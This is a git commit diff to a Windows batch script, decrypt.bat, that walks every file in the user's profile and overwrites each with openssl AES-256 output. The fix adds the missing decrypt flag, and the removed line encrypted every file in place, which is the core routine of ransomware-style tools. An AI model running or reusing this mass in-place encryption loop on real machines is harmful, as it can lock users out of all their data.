7c2afcf1364e85ee8ce8fb258b43422778fee54e
jeff160 <141229412+jeff-160@users.noreply.github.com>
2025-01-30 23:59:11 +0800

    Add files via upload

--- decrypt.bat
+++ decrypt.bat
@@ -8,7 +8,7 @@ for /r "%USERPROFILE%"  %%f in (*) do (
     echo %%f | findstr /i %~dp0 >nul
 
     if errorlevel 1 (
-        openssl enc -aes-256-cbc -in %%f -out "%%f.temp" -pass pass:%key% -pbkdf2
+        openssl enc -d -aes-256-cbc -in %%f -out "%%f.temp" -pass pass:%key% -pbkdf2
         move /Y "%%f.temp" %%f >nul 2>&1
     )
 )
